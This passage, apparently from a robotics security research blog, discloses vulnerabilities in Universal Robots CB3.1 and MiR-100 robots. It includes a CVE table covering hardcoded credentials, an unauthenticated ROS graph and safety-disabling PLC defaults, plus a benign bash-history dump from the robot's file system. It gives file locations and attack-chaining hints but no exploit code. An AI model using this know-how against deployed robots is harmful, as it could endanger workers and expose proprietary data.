    <p>The reason why OpenSSH is vulnerable is because before version 7.3, when SHA256 or SHA512 are used for user password hashing, it uses BLOWFISH hashing on a static password when the username does not exist. This allows remote attackers to enumerate users by leveraging the time difference between responses when a large password is provided, figuring out which users are valid and which ones aren’t.</p>
    <p><a href="https://asciinema.org/a/315015"><img src="https://asciinema.org/a/315015.svg" alt="asciicast" /></a></p>
    <h4 id="integer-overflow-in-the-get_data-function-zipimport.c-in-python-2.7">Integer overflow in the get_data function, zipimport.c in Python 2.7</h4>
    <p>In this bug we explored an integer overflow in the <code>get_data</code> function in <code>zipimport.c</code> in CPython (aka Python) before <code>2.7.12</code>, <code>3.x</code> before <code>3.4.5</code>, and <code>3.5.x</code> before <code>3.5.2</code> allows remote attackers to have unspecified impact via a negative data size value, which triggers a heap-based buffer overflow.</p>
    <p>The video below demonstrates how this flaw affects firmware versions CB3.1 <code>1.12.1</code>, <code>1.12</code>, <code>1.11</code> and <code>1.10</code>. Beyond our triaging is testing earlier version but we can only guess that it’ll follow along. Further exploitation of the heap-based overflow is beyond the scope of this simple exercise but a sufficiently motivated attacker won’t certainly stop here ;).</p>
    <p><a href="https://asciinema.org/a/315891"><img src="https://asciinema.org/a/315891.svg" alt="asciicast" /></a></p>
    <h4 id="unprotected-intellectual-property-in-universal-robots-controller-cb-3.1-across-firmware-versions">Unprotected intellectual property in Universal Robots controller CB 3.1 across firmware versions</h4>
    <p>This is <strong>one of the most concerning bugs found</strong>. Connected to <a href="https://github.com/aliasrobotics/RVD/issues/1487">RVD#1487</a>, the lack of protected Intellectual Property (IP) from third parties allows an attacker to exfiltrate all intellectual property living into the robot and acquired from UR+ platform or other means.</p>
    <p>More specifically and as described in our report: &gt; Universal Robots control box CB 3.1 across firmware versions (tested on 1.12.1, 1.12, 1.11 and 1.10) does not encrypt or protect in any way the intellectual property artifacts installed from the UR+ platform of hardware and software components (URCaps). These files (.urcaps) are stored under ‘/root/.urcaps’ as plain zip files containing all the logic to add functionality to the UR3, UR5 and UR10 robots. This flaw allows attackers with access to the robot or the robot network (while in combination with other flaws) to retrieve and easily exfiltrate all installed intellectual property. &gt;</p>
    <p>The following video demonstrates this process chaining the attack with other vulnerabilities.</p>
    <p><a href="https://asciinema.org/a/EJ5ZzqAbiVvPLyNABXyOk3iez"><img src="https://asciinema.org/a/EJ5ZzqAbiVvPLyNABXyOk3iez.svg" alt="asciicast" /></a></p>
    <h2 id="mobile-industrial-robots-mir-100">Mobile Industrial Robots’ MiR-100</h2>
    <figure>
    <img src="images/2020/mir100.png" alt="Mobile Industrial Robots’ MiR-100" /><figcaption aria-hidden="true">Mobile Industrial Robots’ MiR-100</figcaption>
    </figure>
    <p>Autonomous Mobile Robots (AMRs) are a popular trend for industrial automation. Besides in industries, they are also increasingly being used in public environments for tasks that include moving material around, or disinfecting environments with UltraViolet (UV) light (when no human is present, to avoid skin burns or worse).</p>
    <p>Among the popular AMRs we encounter Mobile Industrial Robot’s MiR-100 which is often used as a mobile base for building other robots.</p>
    <p>Research performed in past engagements led to more than 100 flaws identified in robots from MiR. Here’re some of the novel ones we published:</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2566">CVE-2020-10269</a></td>
    <td>Hardcoded Credentials on MiRX00 wireless Access Point</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2566">9.8</a></td>
    <td>firmware v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2557">CVE-2020-10270</a></td>
    <td>Hardcoded Credentials on MiRX00 Control Dashboard</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2557">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2555">CVE-2020-10271</a></td>
    <td>MiR ROS computational graph is exposed to all network interfaces, including poorly secured wireless networks and open wired ones</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2555">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2554">CVE-2020-10272</a></td>
    <td>MiR ROS computational graph presents no authentication mechanisms</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2554">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2560">CVE-2020-10273</a></td>
    <td>Unprotected intellectual property in Mobile Industrial Robots (MiR) controllers</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2560">7.5</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2556">CVE-2020-10274</a></td>
    <td>MiR REST API allows for data exfiltration by unauthorized attackers (e.g. indoor maps)</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2556">7.1</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2565">CVE-2020-10275</a></td>
    <td>Weak token generation for the REST API</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2565">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2558">CVE-2020-10276</a></td>
    <td>Default credentials on SICK PLC allows disabling safety features</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2558">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2562">CVE-2020-10277</a></td>
    <td>Booting from a live image leads to exfiltration of sensible information and privilege escalation</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2562">6.4</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2561">CVE-2020-10278</a></td>
    <td>Unprotected BIOS allows user to boot from live OS image</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2561">6.1</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2569">CVE-2020-10279</a></td>
    <td>Insecure operating system defaults in MiR robots</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2569">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2568">CVE-2020-10280</a></td>
    <td>Apache server is vulnerable to a DoS</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2568">8.2</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    </tbody>
    </table>
    <p>Below, we review briefly the file system and then discuss a few of these with their corresponding PoCs.</p>
    <h3 id="reviewing-the-robots-file-system">Reviewing the robot’s file system</h3>
    <p>Let’s take a look at what’s inside of the rootfs:</p>
    <div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ubuntu 16.04  --&gt; EoL</span></span>
    <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@67817dedc5ca:/#</span> cat /etc/issue</span>
    <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Ubuntu</span> 16.04.2 LTS <span class="dt">\n</span> <span class="dt">\l</span></span>
    <span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co"># ROS 1 Kinetic   --&gt; EoL</span></span>
    <span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@67817dedc5ca:/#</span> ls /opt/ros/</span>
    <span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ex">kinetic</span></span></code></pre></div>
    <p>Fantastic EoL setup, both the file system as well as the ROS distro :(. Let’s look a bit deeper:</p>
    <div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /root</span>
    <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@67817dedc5ca:~#</span> ls <span class="at">-a</span></span>
    <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span>  ..  .bash_history  .bashrc  .cache  .config  .gnupg  .nano  .nmcli-history  .profile  .ros  .ssh  .viminfo  script_logs</span></code></pre></div>
    <p>This is fantastic :x:, :laughing:. Let’s inspect a bit the history, just for fun:</p>
    <div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install ros-kinetic-openni-launch</span>
    <span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install libnm-glib-dev</span>
    <span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">pip</span> install <span class="at">--upgrade</span> pip</span>
    <span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">pip</span> install <span class="at">--upgrade</span> mysql-connector</span>
    <span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">poweroff</span></span>
    <span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /etc/polkit-1/localauthority/50-local.d/</span>
    <span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> 10-network-manager.pkla /etc/polkit-1/localauthority/50-local.d/</span>
    <span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> connect_to_wifi.py</span>
    <span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">vi</span> /etc/polkit-1/localauthority/50-local.d/10-network-manager.pkla</span>
    <span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span></span>
    <span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/mir/</span>
    <span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> software</span>
    <span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="fu">mv</span> out.zip software/</span>
    <span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> software/</span>
    <span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="fu">unzip</span> out.zip</span>
    <span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> <span class="at">-R</span> 755 .</span>
    <span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> out.zip</span>
    <span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> <span class="at">-R</span> 655 MIR_SOFTWARE_VERSION</span>
    <span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 555 MIR_SOFTWARE_VERSION</span>
    <span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 444 MIR_SOFTWARE_VERSION</span>
    <span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 666 MIR_SOFTWARE_VERSION</span>
    <span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 644 MIR_SOFTWARE_VERSION</span>
    <span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a><span class="ex">ll</span></span>
    <span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
    <span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a><span class="ex">./install_mir_dependencies.bash</span></span>
    <span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> setup_master_disk.bash</span>
    <span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/</span>
    <span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> mir/</span>
    <span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a><span class="ex">ifcomfig</span></span>
    <span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a><span class="fu">ping</span> 8.8.8.8</span>
    <span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> reboot</span>
    <span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a><span class="ex">./install_mir_dependencies.bash</span> <span class="op">&gt;</span> out.txt</span>
    <span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a><span class="ex">./setup_master_disk.bash</span></span>
    <span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/mirex/.bashrc</span>
    <span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x setup_master_disk.bash</span>
    <span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a><span class="ex">./setup_master_disk.bash</span></span>
    <span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> .bashrc</span>
    <span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/software/</span>
    <span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a><span class="ex">./setup_master_disk.bash</span> <span class="op">&gt;</span> out.txt</span>
    <span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/software/</span>
    <span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> setup_master_disk.bash</span>
    <span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> setup_master_disk.bash</span>
    <span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a><span class="ex">./setup_master_disk.bash</span></span>
    <span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> ./setup_master_disk.bash</span>
    <span id="cb6-66"><a href="#cb6-66" aria-hidden="true" tabindex="-1"></a><span class="ex">roscd</span></span>
    <span id="cb6-67"><a href="#cb6-67" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/mir/software/</span>
    <span id="cb6-68"><a href="#cb6-68" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-69"><a href="#cb6-69" aria-hidden="true" tabindex="-1"></a><span class="bu">source</span> robot/mir_ros_env.bash</span>
    <span id="cb6-70"><a href="#cb6-70" aria-hidden="true" tabindex="-1"></a><span class="ex">roscd</span></span>
    <span id="cb6-71"><a href="#cb6-71" aria-hidden="true" tabindex="-1"></a><span class="ex">rosnode</span></span>
    <span id="cb6-72"><a href="#cb6-72" aria-hidden="true" tabindex="-1"></a><span class="ex">rosnode</span> list</span>
    <span id="cb6-73"><a href="#cb6-73" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span>
    <span id="cb6-74"><a href="#cb6-74" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> .bashrc</span>
    <span id="cb6-75"><a href="#cb6-75" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-76"><a href="#cb6-76" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /etc/</span>
    <span id="cb6-77"><a href="#cb6-77" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-78"><a href="#cb6-78" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> init.d/</span>
    <span id="cb6-79"><a href="#cb6-79" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-80"><a href="#cb6-80" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/mirex/.bashrc</span>
    <span id="cb6-81"><a href="#cb6-81" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-82"><a href="#cb6-82" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /etc/sudoers.d/</span>
    <span id="cb6-83"><a href="#cb6-83" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-84"><a href="#cb6-84" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/mir/software/robot/conf/robot</span>
    <span id="cb6-85"><a href="#cb6-85" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-86"><a href="#cb6-86" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> home/</span>
    <span id="cb6-87"><a href="#cb6-87" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-88"><a href="#cb6-88" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> mirex/</span>
    <span id="cb6-89"><a href="#cb6-89" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-90"><a href="#cb6-90" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-lah</span></span>
    <span id="cb6-91"><a href="#cb6-91" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> .bashrc</span>
    <span id="cb6-92"><a href="#cb6-92" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/mirex/.bashrc</span>
    <span id="cb6-93"><a href="#cb6-93" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span>
    <span id="cb6-94"><a href="#cb6-94" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home/mirex/</span>
    <span id="cb6-95"><a href="#cb6-95" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-96"><a href="#cb6-96" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> setup_master_disk.bash</span>
    <span id="cb6-97"><a href="#cb6-97" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-98"><a href="#cb6-98" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> out.txt</span>
    <span id="cb6-99"><a href="#cb6-99" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-100"><a href="#cb6-100" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> setup_master_disk.bash</span>
    <span id="cb6-101"><a href="#cb6-101" aria-hidden="true" tabindex="-1"></a><span class="bu">source</span> /usr/local/mir/software/robot/mir_ros_env.bash</span>
    <span id="cb6-102"><a href="#cb6-102" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> python setup_master_disk.bash</span>
    <span id="cb6-103"><a href="#cb6-103" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> python setup_master_disk.bash <span class="op">&gt;</span> temp.sh</span>
    <span id="cb6-104"><a href="#cb6-104" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x temp.sh</span>
    <span id="cb6-105"><a href="#cb6-105" aria-hidden="true" tabindex="-1"></a><span class="ex">./temp.sh</span></span>
    <span id="cb6-106"><a href="#cb6-106" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> temp.sh</span>
    <span id="cb6-107"><a href="#cb6-107" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-108"><a href="#cb6-108" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$MIR_SOFTWARE_PATH</span></span>
    <span id="cb6-109"><a href="#cb6-109" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> setup_master_disk.bash</span>
    <span id="cb6-110"><a href="#cb6-110" aria-hidden="true" tabindex="-1"></a><span class="ex">./temp.sh</span></span>
    <span id="cb6-111"><a href="#cb6-111" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-alh</span> /home/mirex/.bashrc</span>
    <span id="cb6-112"><a href="#cb6-112" aria-hidden="true" tabindex="-1"></a><span class="fu">date</span></span>
    <span id="cb6-113"><a href="#cb6-113" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$MIR_SOFTWARE_PATH</span>/</span>
    <span id="cb6-114"><a href="#cb6-114" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /usr/local/mir/software/</span>
    <span id="cb6-115"><a href="#cb6-115" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /usr/local/mir/</span>
    <span id="cb6-116"><a href="#cb6-116" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-117"><a href="#cb6-117" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> software/</span>
    <span id="cb6-118"><a href="#cb6-118" aria-hidden="true" tabindex="-1"></a><span class="ex">la</span></span>
    <span id="cb6-119"><a href="#cb6-119" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> shared/</span>
    <span id="cb6-120"><a href="#cb6-120" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-121"><a href="#cb6-121" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
    <span id="cb6-122"><a href="#cb6-122" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-123"><a href="#cb6-123" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> robot/release/</span>
    <span id="cb6-124"><a href="#cb6-124" aria-hidden="true" tabindex="-1"></a><span class="ex">s</span></span>
    <span id="cb6-125"><a href="#cb6-125" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-126"><a href="#cb6-126" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> install_utils.py</span>
    <span id="cb6-127"><a href="#cb6-127" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> /home/mirex/setup_master_disk.bash</span>
    <span id="cb6-128"><a href="#cb6-128" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-129"><a href="#cb6-129" aria-hidden="true" tabindex="-1"></a><span class="fu">less</span> config_utils.py</span>
    <span id="cb6-130"><a href="#cb6-130" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> config_utils.py</span>
    <span id="cb6-131"><a href="#cb6-131" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home/mirex/</span>
    <span id="cb6-132"><a href="#cb6-132" aria-hidden="true" tabindex="-1"></a><span class="ex">./temp.sh</span></span>
    <span id="cb6-133"><a href="#cb6-133" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> <span class="at">-</span></span>
    <span id="cb6-134"><a href="#cb6-134" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> config_utils.py</span>
    <span id="cb6-135"><a href="#cb6-135" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> /home/mirex/setup_master_disk.bash</span>
    <span id="cb6-136"><a href="#cb6-136" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> config_utils.py</span>
    <span id="cb6-137"><a href="#cb6-137" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> <span class="at">-</span></span>
    <span id="cb6-138"><a href="#cb6-138" aria-hidden="true" tabindex="-1"></a><span class="ex">./temp.sh</span></span>
    <span id="cb6-139"><a href="#cb6-139" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> /usr/local/mir/software/robot/release/config_utils.py</span>
    <span id="cb6-140"><a href="#cb6-140" aria-hidden="true" tabindex="-1"></a><span class="ex">./temp.sh</span></span>
    <span id="cb6-141"><a href="#cb6-141" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> temp.sh</span>
    <span id="cb6-142"><a href="#cb6-142" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span></span>
    <span id="cb6-143"><a href="#cb6-143" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> <span class="at">-w</span> setup_master_disk.bash</span>
    <span id="cb6-144"><a href="#cb6-144" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span></span>
    <span id="cb6-145"><a href="#cb6-145" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-146"><a href="#cb6-146" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-147"><a href="#cb6-147" aria-hidden="true" tabindex="-1"></a><span class="ex">ifconfig</span></span>
    <span id="cb6-148"><a href="#cb6-148" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span>
    <span id="cb6-149"><a href="#cb6-149" aria-hidden="true" tabindex="-1"></a><span class="fu">tail</span> <span class="at">-f</span> out.txt</span>
